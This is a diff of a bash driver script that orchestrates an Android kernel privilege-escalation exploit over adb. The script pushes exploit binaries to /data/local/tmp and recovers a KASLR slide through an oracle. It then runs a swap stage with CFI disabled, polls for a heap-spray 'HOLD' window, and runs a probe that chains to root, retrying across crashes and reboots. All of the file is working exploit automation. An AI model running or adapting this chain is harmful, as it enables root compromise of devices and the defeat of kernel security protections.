@@ -1,10 +1,12 @@
 #!/bin/bash
-# rw_drive.sh — full R/W root cycle driver (host, Git Bash).
-# See docs/ROOT_PLAN_2026-08-28.md. Usage: ./rw_drive.sh [max_cycles]
+# rw_drive.sh v2 — collapse-plan driver (host, Git Bash).
+# O-fire (spray-free oracle) -> decode -> N-fire (swap, HOLD, detached)
+# -> poll HOLD marker -> swap_probe v4 (collapse + root chain).
+# Usage: ./rw_drive.sh [max_cycles]
 ADB="/c/Users/LENOVO/AppData/Local/Microsoft/WinGet/Packages/Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe/platform-tools/adb.exe"
 SER=192.168.1.108:5555
 ROOT="$(cd "$(dirname "$0")" && pwd)"
-MAX=${1:-8}
+MAX=${1:-10}
 
 adb() { MSYS_NO_PATHCONV=1 "$ADB" -s "$SER" "$@"; }
 
@@ -14,60 +16,76 @@ adb push "$ROOT/ghostlock-cph2521" /data/local/tmp/gl_rw >/dev/null 2>&1
 adb push "$ROOT/swap_probe" /data/local/tmp/swap_probe >/dev/null 2>&1
 adb shell "chmod 755 /data/local/tmp/gl_rw /data/local/tmp/swap_probe" >/dev/null 2>&1
 
-make_runner() {  # $1=file $2=env-assignments...
-  local f=$1; shift
-  printf '#!/system/bin/sh\n' > "$f"
-  printf 'export MODE4_ONLY=1\n' >> "$f"
-  for e in "$@"; do printf 'export %s\n' "$e" >> "$f"; done
-  printf 'cd /data/local/tmp\n/data/local/tmp/gl_rw > /data/local/tmp/gl_out.txt 2>&1\necho EXIT=$?\n' >> "$f"
-}
+uptime() { adb shell "cut -d. -f1 /proc/uptime" 2>/dev/null | tr -d '\r'; }
 
 for cycle in $(seq 1 $MAX); do
-  echo "=== CYCLE $cycle =========================================="
-  # uptime before (continuity check data)
-  UP0=$(adb shell "cut -d. -f1 /proc/uptime" | tr -d '\r')
+  echo "=== CYCLE $cycle === $(date +%H:%M:%S)"
+  UP0=$(uptime)
+  [ -z "$UP0" ] && { echo "no adb; waiting"; "$ADB" connect $SER >/dev/null 2>&1; sleep 20; continue; }
+  [ "$UP0" -lt 130 ] && { echo "uptime ${UP0}s < 130 — waiting for boot to settle"; sleep $((130-UP0+10)); }
 
-  # ---- O-fire: oracle ----
-  make_runner /tmp/gl_o.sh "MODE4_SLIDE=1"
-  adb push /tmp/gl_o.sh /data/local/tmp/gl_run.sh >/dev/null 2>&1
-  adb shell "tr -d '\\r' < /data/local/tmp/gl_run.sh > /data/local/tmp/glr.sh; chmod 755 /data/local/tmp/glr.sh; /data/local/tmp/glr.sh" | tr -d '\r' | tail -1
+  # ---- O-fire: spray-free oracle (blocking; process exits) ----
+  printf '#!/system/bin/sh\nexport MODE4_ONLY=1\nexport MODE4_SLIDE=1\nexport MODE4_SWAP_NOCFI=1\ncd /data/local/tmp\nexec /data/local/tmp/gl_rw\n' > /tmp/gl_o.sh
+  adb push /tmp/gl_o.sh /data/local/tmp/glr.sh >/dev/null 2>&1
+  adb shell "tr -d '\\r' < /data/local/tmp/glr.sh > /data/local/tmp/glrr.sh; chmod 755 /data/local/tmp/glrr.sh; /data/local/tmp/glrr.sh" >/dev/null 2>&1
   BID=$(adb shell "cat /proc/sys/kernel/random/boot_id" | tr -d '\r')
-  UP1=$(adb shell "cut -d. -f1 /proc/uptime" | tr -d '\r')
-  echo "boot_id=$BID uptime=$UP0->$UP1"
-  SLIDE=$(python "$ROOT/tools/slide_decode.py" "$BID" | awk '{print $3}')
-  echo "slide=$SLIDE"
+  UP1=$(uptime)
+  echo "O-fire: boot_id=$BID uptime=$UP1"
+  [ -z "$UP1" ] && { echo "O-fire crashed boot; settling"; sleep 100; continue; }
+  SLIDE=$(python "$ROOT/tools/slide_decode.py" "$BID" 2>/dev/null | awk '{print $3}')
   if [ "$SLIDE" = "None" ] || [ -z "$SLIDE" ]; then
-    echo "oracle miss (walk); waiting for stable boot and re-rolling"
+    echo "oracle miss; re-roll"
+    sleep 45; continue
+  fi
+  echo "SLIDE=$SLIDE (redirect live)"
+
+  # ---- N-fire: swap + HOLD, detached ----
+  printf '#!/system/bin/sh\nexport MODE4_ONLY=1\nexport MODE4_SLIDE_SWAP=1\nexport KASLR_SLIDE=%s\nexport MODE4_SWAP_NOCFI=1\nexport MODE4_SWAP_HOLD=1\ncd /data/local/tmp\nexec /data/local/tmp/gl_rw\n' "$SLIDE" > /tmp/gl_n.sh
+  adb push /tmp/gl_n.sh /data/local/tmp/glr.sh >/dev/null 2>&1
+  adb shell "tr -d '\\r' < /data/local/tmp/glr.sh > /data/local/tmp/glrr.sh; chmod 755 /data/local/tmp/glrr.sh; rm -f /data/local/tmp/gl_out.txt; nohup /data/local/tmp/glrr.sh > /data/local/tmp/gl_out.txt 2>&1 &" >/dev/null 2>&1
+
+  # ---- poll for HOLD (walk done, swap live) ----
+  HOLD=""
+  for i in $(seq 1 90); do
+    H=$(adb shell "grep -c 'SWAP_HOLD\|HOLD: spray live' /data/local/tmp/gl_out.txt 2>/dev/null" | tr -d '\r')
+    [ "$H" -ge 1 ] 2>/dev/null && { HOLD=1; break; }
+    # died early?
+    D=$(adb shell "grep -c 'EXIT=' /data/local/tmp/gl_out.txt 2>/dev/null" | tr -d '\r')
+    [ "$D" -ge 1 ] 2>/dev/null && break
+    sleep 3
+  done
+  UP2=$(uptime)
+  if [ -z "$HOLD" ]; then
+    echo "N-fire no HOLD (uptime $UP1 -> $UP2); re-roll"
+    adb shell "pkill -f glrr.sh; pkill gl_rw" >/dev/null 2>&1
     sleep 90; continue
   fi
-
-  # ---- N-fire: swap, no open ----
-  make_runner /tmp/gl_n.sh "MODE4_SLIDE_SWAP=1" "KASLR_SLIDE=$SLIDE" "MODE4_SWAP_NOCFI=1"
-  adb push /tmp/gl_n.sh /data/local/tmp/gl_run.sh >/dev/null 2>&1
-  adb shell "tr -d '\\r' < /data/local/tmp/gl_run.sh > /data/local/tmp/glr.sh; chmod 755 /data/local/tmp/glr.sh; /data/local/tmp/glr.sh" | tr -d '\r' | tail -1
-  UP2=$(adb shell "cut -d. -f1 /proc/uptime" | tr -d '\r')
-  echo "post-swap uptime=$UP2 (rebooted if < $UP1)"
   FF=$(adb shell "grep -o 'fake_fops (ffffff[0-9a-f]*)' /data/local/tmp/gl_out.txt | tail -1 | grep -o 'ffffff[0-9a-f]*'" | tr -d '\r')
-  echo "fake_fops=$FF"
-  if [ -z "$FF" ]; then
-    echo "swap walk miss; re-roll"
-    sleep 90; continue
-  fi
-  if [ "$UP2" -lt "$UP1" ]; then
-    echo "device softbooted during swap walk; re-roll"
-    sleep 90; continue
-  fi
+  GLPID=$(adb shell "grep -o 'pid=[0-9]*' /data/local/tmp/gl_out.txt | head -1 | cut -d= -f2" | tr -d '\r')
+  echo "WINDOW OPEN: fake_fops=$FF gl_pid=$GLPID uptime=$UP2"
 
-  # ---- WINDOW OPEN: run probe NOW ----
-  echo "--- WINDOW OPEN: swap_probe $FF $SLIDE ---"
-  adb shell "/data/local/tmp/swap_probe $FF $SLIDE 2>&1" | tr -d '\r'
+  # ---- THE PROBE (collapse + root) ----
+  adb shell "/data/local/tmp/swap_probe $FF $SLIDE $GLPID 2>&1" | tr -d '\r'
   RC=$?
   echo "probe rc=$RC"
-  adb shell "cat /data/local/tmp/ROOTED 2>/dev/null" | tr -d '\r'
-  adb shell "id; cat /proc/uptime" | tr -d '\r'
-  if [ $RC -eq 0 ]; then echo "*** ROOT ACHIEVED cycle $cycle ***"; exit 0; fi
-  echo "window failed; re-roll"
-  sleep 90
+  sleep 3
+  adb shell "cat /data/local/tmp/ROOTED 2>/dev/null; id; cut -d. -f1 /proc/uptime" | tr -d '\r'
+  if adb shell "test -f /data/local/tmp/ROOTED" >/dev/null 2>&1; then
+    echo "*** ROOT PROOF FILE EXISTS — cycle $cycle ***"
+    exit 0
+  fi
+  # boot survived?
+  UP3=$(uptime)
+  echo "post-probe uptime=$UP3"
+  adb shell "pkill -f glrr.sh; pkill gl_rw" >/dev/null 2>&1
+  if [ -n "$UP3" ] && [ "$UP3" -ge "$UP2" ] 2>/dev/null; then
+    echo "boot alive after probe — cleaning stale ROOTED and re-rolling"
+    adb shell "rm -f /data/local/tmp/ROOTED" >/dev/null 2>&1
+    sleep 20
+  else
+    echo "boot rebooted after probe; settling"
+    sleep 100
+  fi
 done
 echo "no root after $MAX cycles"
 exit 1
